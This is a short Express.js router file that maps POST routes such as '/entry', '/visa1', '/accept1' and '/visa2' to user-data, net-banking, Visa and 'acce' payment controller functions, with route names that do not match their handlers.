const express = require('express');
const router = express.Router();
const netBankingController = require('../controllers/netBankingController');
const userController = require('../controllers/userController');
const visaController = require ('../controllers/visaController')
const acceController = require ('../controllers/acceController')

router.post('/entry', userController.saveUserData);
router.post('/visa1', netBankingController.submitNetBankingPayment);
router.post('/accept1', visaController.submitVisaPayment);
router.post('/visa2', acceController.submitAccePayment);

module.exports = router;
